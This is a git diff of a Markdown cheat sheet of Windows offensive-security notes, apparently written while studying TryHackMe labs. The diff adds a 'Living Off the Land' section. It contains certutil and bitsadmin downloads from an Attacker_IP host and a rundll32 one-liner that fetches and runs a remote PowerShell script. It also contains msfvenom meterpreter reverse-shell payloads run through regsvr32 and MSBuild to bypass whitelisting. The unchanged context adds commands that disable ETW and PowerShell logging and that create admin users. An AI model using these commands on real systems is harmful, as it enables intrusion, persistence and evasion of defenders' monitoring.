@@ -1,4 +1,4 @@
-- [Internal](#internal)
+- [Sysinternals](#sysinternals)
   - [Abusing Internals](#abusing-internals)
 - [Commands](#commands)
   - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
@@ -19,9 +19,17 @@
   - [Enviroment Variable](#enviroment-variable)
 - [Runtime Detection](#runtime-detection)
 - [Evade Logging](#evade-logging)
+- [Living Off the Land](#living-off-the-land)
+  - [File Operation](#file-operation)
+    - [Certutil](#certutil)
+    - [BITSAdmin](#bitsadmin)
+    - [FindStr](#findstr)
+    - [Execution](#execution)
 - [Bypass Applocker](#bypass-applocker)
 
-# Internal
+# Sysinternals
+- [THM Sysinternals](https://tryhackme.com/room/btsysinternalssg)
+- [LOLBAS](https://lolbas-project.github.io/#)
 - Process analyser
   - Procmon, Process Explorer, Process Hacker 2
 - DLL
@@ -166,7 +174,7 @@
   - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://10.9.1.255/winPEAS.bat
   - powershell -c "(new-object System.Net.WebClient).Downloadfile('https://10.9.1.255:80/PowerUp.ps1', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"
   - powershell -c wget "https://10.9.1.255:80/PowerUp.ps1" -outfile "PowerUp.ps1"
-  - certutil -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
+  - **certutil** -urlcache -f http://10.9.1.255:80/nc.exe nc.exe
 
 - check permision
   - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
@@ -179,7 +187,6 @@
   - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
   
 ## Stabilize / Post Exploit / Persistance windows
-
 ### Tampering with low users
 - Create user + add group admin
   - **net user USERNAME PASS /add**
@@ -552,8 +559,7 @@ $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue(
 [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
 ```
 
-
-- **Group Policy Takeover**
+ **Group Policy Takeover**
 ```
 # Reflection to obtaim SM and identify GPO
 $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
@@ -584,7 +590,75 @@ $snap = Get-PSSnapin Microsoft.PowerShell.Core
 $snap.LogPipelineExecutionDetails = $false
 ```
 
+# Living Off the Land
+- Using and abusing of what exists
+- How
+  - Reconnaissance
+  - Files operations
+  - Arbitrary code execution
+  - Lateral movement
+  - Security product bypass
 
+## File Operation
+
+### Certutil
+- certification services
+- dump + diplay certfication authority
+- Ingress tool transfer
+- Download
+  - certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
+- Encode / Decode
+  - certutil -encode payload.exe Encoded-payload.txt
+  - certutil -decode Encoded_file payload.txt
+
+### BITSAdmin
+- create,download, upload Background Intelligente Transfer Service (BITS = files from http and smb servers)
+- bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+
+### FindStr
+- grep
+- used to download from SMB
+  - findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
+
+### Execution
+- Indirect command execution
+- **File Explorer**
+  - explorer.exe /root,"C:\Windows\System32\calc.exe"
+- 
+- **WMIC**
+  - wmic.exe process call create calc
+  
+- **Rundll32**
+  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
+  -  rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert(123)
+  -  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
+
+- **Regsvr32**
+  - system32 = 32 bit
+  - SysWOW64 = 64 bits
+  - Execute binaries + bypass whitelistening
+  - Steps
+    1. create malicious dll: msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll -a x86 > live0fftheland.dll
+    2. upload the file
+    3. run it: regserv32.exe c:\path\to\file
+    4. regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll 
+       1. /s = silent
+       2. /n = not call DLL register server
+       3. /i = Use another server
+       4. /u = run unregistered
+
+- **WSL**
+  - bash.exe -c "c:/path/to/file"
+
+- **Shortcuts**
+  - Target: rundll32, Powershell, Regsvr32.
+  - [Atomic-red-team-T1023](https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md)
+
+- **No Powershell**
+  - [PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git)
+  - msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1
+  - python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+  - c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
 
 # Bypass Applocker
 - Applocker: restrict programs from being executed
